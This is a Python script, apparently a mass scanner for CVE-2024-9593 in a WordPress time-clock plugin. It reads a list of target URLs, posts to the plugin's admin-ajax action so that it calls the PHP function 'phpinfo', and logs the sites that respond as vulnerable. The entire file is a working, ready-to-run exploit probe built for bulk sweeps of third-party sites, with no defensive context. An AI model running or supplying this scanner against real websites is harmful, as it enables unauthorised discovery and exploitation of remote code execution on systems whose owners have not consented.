from colorama import init, Fore

import asyncio

import time

import aiohttp

import aiofiles


# Initialize Colorama

init(autoreset=True)


# Define headers and data for the POST request

headers = {

    'Content-Type': 'application/x-www-form-urlencoded'

}

data = {

    'function': 'phpinfo'

}


async def get_url(url):

    async with aiohttp.ClientSession() as session:

        try:

            async with session.post(url, data=data, headers=headers, timeout=6) as resp:

                response = await resp.text()

                if resp.status == 200:

                    if 'etc' in response:

                        print(Fore.RED + f'[+++] Vulnerability found ----> {url}')

                        async with aiofiles.open('Results/CVE-2024-9593.txt', 'a') as f:

                            await f.write(url + '\n')

                    else:

                        print(f'[-] Not found {url}')

        except Exception as e:

            print(f"Error fetching {url}: {e}")


async def main():

    tasks = []

    async with aiofiles.open(book, 'r') as f:

        async for line in f:

            line = line.strip()

            url = f"{line}/wp-admin/admin-ajax.php?action=etimeclockwp_load_function"

            print(url)

            tasks.append(get_url(url))

    await asyncio.gather(*tasks)


if __name__ == '__main__':

    book = input('Enter your url.txt (each line should contain one URL): ')

    start_time = time.time()

    asyncio.run(main())

    end_time = time.time()

    print(f"Time taken: {end_time - start_time} s")